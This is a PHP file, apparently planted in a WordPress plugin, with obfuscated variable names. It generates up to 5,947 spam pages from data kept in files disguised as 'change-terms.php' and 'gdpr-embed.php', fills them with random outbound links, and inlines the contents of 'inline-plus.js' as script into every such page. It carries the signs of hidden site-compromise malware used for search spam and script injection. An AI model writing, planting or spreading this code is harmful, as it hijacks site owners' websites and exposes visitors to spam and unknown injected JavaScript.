<?php
$dyIPXjx = intval(get_query_var('djneb'));

if ($dyIPXjx < 1 || $dyIPXjx > 5947) return;
$eZmA9rO2 = file(plugin_dir_path(__FILE__).'change-terms.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$sgKSaQGGFo = explode(';', $eZmA9rO2[$dyIPXjx]);
if (count($sgKSaQGGFo) < 2) return;
$c5ADS = $sgKSaQGGFo[0];
$kuF1vg  = $sgKSaQGGFo[1];
$oxG8Um = $sgKSaQGGFo[2];
$aM3Jtydob  = $sgKSaQGGFo[3];
$qEE4v = $sgKSaQGGFo[4];
set_query_var('mncqwpq', $c5ADS);

$iJoDnEORu = '';
$wssOwNsagG = plugin_dir_path(__FILE__).'gdpr-embed.php';
if (is_file($wssOwNsagG)) {
	$o9sOO = file($wssOwNsagG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($o9sOO);
	shuffle($o9sOO);
	$eGyaX = mt_rand(2, 5);
	if (count($o9sOO) > $eGyaX) {
		for ($jIMJWMgTsV = 0; $jIMJWMgTsV < $eGyaX; $jIMJWMgTsV++) {
			$uUad3vXPv = array_shift($o9sOO);
			$iJoDnEORu .= '<p><a href="'.$uUad3vXPv.'">'.$uUad3vXPv.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $c5ADS; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $kuF1vg . "</p>\n";
				if (strlen($aM3Jtydob) > 0) echo "<p>" . $aM3Jtydob . "</p>\n";
				if (strlen($oxG8Um) > 0) echo "<p>" . $oxG8Um . "</p>\n";
				if (strlen($qEE4v) > 0) echo '<p><a href="#"><img src="'.$qEE4v.'"></a>' . "</p>\n";
				echo $iJoDnEORu;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$qXeG9ydki3 = plugin_dir_path(__FILE__) . 'inline-plus.js';
if (is_file($qXeG9ydki3)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($qXeG9ydki3);
	echo '</script>';
}
get_footer();
?>
